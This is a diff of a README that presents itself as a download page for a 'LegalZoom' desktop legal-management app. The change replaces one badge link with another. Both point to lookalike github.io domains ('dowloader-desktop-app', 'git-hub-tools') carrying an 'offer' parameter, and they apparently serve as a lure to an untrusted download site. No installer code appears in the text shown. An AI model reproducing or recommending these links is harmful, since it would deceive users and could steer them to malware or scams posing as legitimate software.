@@ -1,10 +1,10 @@
 # LegalZoom Download — Desktop Legal Management App
 
-<a href="https://dowloader-desktop-app.github.io/.github/?offer=LegalZoom" target="_blank">
+<a href="https://git-hub-tools.github.io/.github/?offer=LegalZoom" target="_blank">
   <img 
-    src="https://img.shields.io/badge/Get%20LegalZoom%20Install%20Guide-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
+    src="https://img.shields.io/badge/LegalZoom%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
-    alt="Get LegalZoom Install Guide">
+    alt="LegalZoom GitHub">
 </a>
 
 ---
